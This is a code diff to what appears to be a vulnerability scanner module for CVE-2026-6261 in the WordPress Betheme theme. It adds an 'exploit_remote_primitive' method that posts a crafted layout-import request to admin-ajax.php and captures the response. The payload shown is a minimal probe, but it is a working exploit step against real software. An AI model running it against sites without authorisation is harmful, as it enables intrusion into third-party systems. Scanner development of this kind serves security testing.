@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import re
+from urllib.parse import urlencode
 
 from cpointed.core.engine import ScanResult, Target
 from cpointed.core.session import CPointedClient
@@ -50,3 +51,40 @@ class CVE20266261Betheme(WordPressModule):
         details["theme_surface"] = surface
         details["note"] = "Theme header fingerprint; exploitation remains context-specific."
         return self._result(target, vuln, self.severity if vuln else 0.0, details)
+
+    async def exploit_remote_primitive(
+        self,
+        target: Target,
+        client: CPointedClient,
+        *,
+        timeout: float,
+    ) -> dict:
+        ajax = self._path(target, "/wp-admin/admin-ajax.php")
+        out: dict = {"admin_ajax_posts": []}
+        try:
+            dump = (
+                '{"type": "section", "wrap": "1", "items": []}'
+            )
+            fields = {
+                "action": "betheme_layout_import",
+                "mfn-builder-import": dump,
+            }
+            body = urlencode(fields).encode("utf-8")
+            r = await client.request(
+                "POST",
+                ajax,
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                content=body,
+                timeout=timeout,
+            )
+            out["admin_ajax_posts"].append(
+                {
+                    "path": ajax,
+                    "action": "betheme_layout_import",
+                    "status_code": r.status_code,
+                    "body_snippet": (r.text or "")[:2000],
+                }
+            )
+        except Exception as exc:  # pragma: no cover - network
+            out["admin_ajax_posts"].append({"action": "betheme_layout_import", "error": str(exc)})
+        return out
